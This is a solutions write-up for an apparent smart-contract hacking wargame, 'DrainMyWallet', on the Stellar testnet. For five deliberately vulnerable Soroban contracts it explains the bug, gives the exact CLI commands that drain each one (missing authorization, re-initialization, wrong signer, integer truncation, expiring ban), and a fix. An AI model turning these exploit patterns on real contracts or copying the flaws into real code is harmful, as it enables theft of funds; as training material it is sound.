# DrainMyWallet: solutions

**Spoilers.** This file lives on the `solutions` branch so that `main` does not give the game away. Every exploit below is also a `cargo test` on `main`, in the level's `test.rs`.

Setup used in every example (testnet):

```bash
stellar keys generate me --network testnet --fund
ME=$(stellar keys address me)
FACTORY=<factory id>            # deployments/testnet.env
LOOT=<LOOT:issuer>              # GAME_ASSET in deployments/testnet.env
```

Create an instance from the site, or from the CLI:

```bash
INSTANCE=$(stellar contract invoke --id $FACTORY --network testnet --source-account me \
  -- new_instance --player $ME --level_id <N> | tr -d '"')
```

Check from the site, or:

```bash
stellar contract invoke --id $FACTORY --network testnet --source-account me \
  -- submit --player $ME --level_id <N>
```

Levels 1 and 2 pay out in `LOOT`: open a trustline first.

```bash
stellar tx new change-trust --line $LOOT --source-account me --network testnet
```

---

## 1. Open Door

**Bug.** `withdraw(to, amount)` moves the vault's tokens to `to` and never calls `require_auth`. Nothing in Soroban is protected unless the code asks for an authorization from the right address. `deposit` does it correctly (`from.require_auth()`), which is what makes the missing check stand out.

**Exploit.** Call `withdraw` for the whole vault (1,000 tokens = `10000000000` stroops), paying yourself:

```bash
stellar contract invoke --id $INSTANCE --network testnet --source-account me \
  -- withdraw --to $ME --amount 10000000000
```

You sign only the transaction itself. The token's `transfer` out of the vault does not need any signature, because the vault is the direct caller.

**Fix.** Decide who may withdraw (an admin or treasurer stored at construction) and call `require_auth()` on that address first.

## 2. Crown

**Bug.** `initialize(admin)` overwrites the stored admin without checking whether one is already set. The contract starts out owned by its own address, so nobody could sweep it, until someone initializes it again.

**Exploit.** Make yourself admin, then sweep:

```bash
stellar contract invoke --id $INSTANCE --network testnet --source-account me -- initialize --admin $ME
stellar contract invoke --id $INSTANCE --network testnet --source-account me -- sweep --to $ME
```

`initialize` does call `admin.require_auth()`, but that only proves the *new* admin agrees, not that the call is allowed. You can always authorize yourself.

**Fix.** Do the setup in `__constructor`, which runs once at deploy time. Otherwise store an `Initialized` flag and panic if it is set.

## 3. Wrong Signer

**Bug.** `withdraw_for(caller, account, amount)` calls `caller.require_auth()`, then debits `account`. Nothing ties the two together: there is no approval and no `caller == account` check. Authenticating someone is not the same as authenticating the owner of the funds.

**Exploit.** Sign as yourself and name the pool (the contract's own address) as the account to debit:

```bash
stellar contract invoke --id $INSTANCE --network testnet --source-account me \
  -- withdraw_for --caller $ME --account $INSTANCE --amount 1000
```

The pool holds `1000` units on an internal ledger, so the whole balance moves to you. No tokens are involved.

**Fix.** Require authorization from the account being debited (`account.require_auth()`), or keep an allowance that `account` granted to `caller`.

## 4. Fatal Cast

**Bug.** `claim_reward(player, amount: i128)` rejects rewards above `MAX_REWARD = 100` with `(amount as u32) > MAX_REWARD`, then credits the full `i128`. An `as` cast truncates silently, whatever the `overflow-checks` profile setting. `2^32 + 1` truncates to `1`, passes the check, and is credited whole.

**Exploit.**

```bash
stellar contract invoke --id $INSTANCE --network testnet --source-account me \
  -- claim_reward --player $ME --amount 4294967297
```

The balance becomes `4294967297`, above the `1,000,000` threshold. Claiming `101` is refused, which shows the cap exists.

**Fix.** Compare in the original type (`amount > MAX_REWARD as i128`) or convert with `u32::try_from(amount)` and treat failure as an error.

## 5. Forgetful List

**Bug.** The ban is stored in **temporary** storage. Temporary entries are deleted when their time-to-live runs out, and a new one lasts only the network minimum, 720 ledgers (about an hour on testnet). After that, `is_banned` answers `false` and the ban is gone for good. The player starts banned.

**Exploit.** Do nothing, wait, then claim:

```bash
stellar contract invoke --id $INSTANCE --network testnet --source-account me --send=no -- is_banned --member $ME
# true... wait about an hour ... false
stellar contract invoke --id $INSTANCE --network testnet --source-account me -- claim --member $ME
```

Before the entry expires, `claim` fails with `Error(Contract, #1)` (Banned).

**Fix.** Security state belongs in persistent storage, with a TTL you manage and extend. Temporary storage is for data you can afford to lose.
